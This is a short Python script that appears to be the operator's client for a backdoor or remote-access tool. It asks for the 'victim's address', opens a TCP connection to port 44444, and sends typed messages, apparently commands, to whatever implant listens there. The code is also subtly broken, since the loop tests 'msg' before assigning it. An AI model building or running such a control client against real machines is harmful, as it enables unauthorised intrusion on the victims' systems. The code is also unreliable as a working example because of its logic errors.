import socket, message
HOST = "0.0.0.0"
PORT = 44444

if __name__ == "__main__":
    HOST = input("victim's address: ")
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))
    while True:
        if msg == "exit":
            break
        msg = message.Message(input("> ").strip())
        if msg == "":
            continue
        
        client.send(msg.Encode().encode("utf-8"))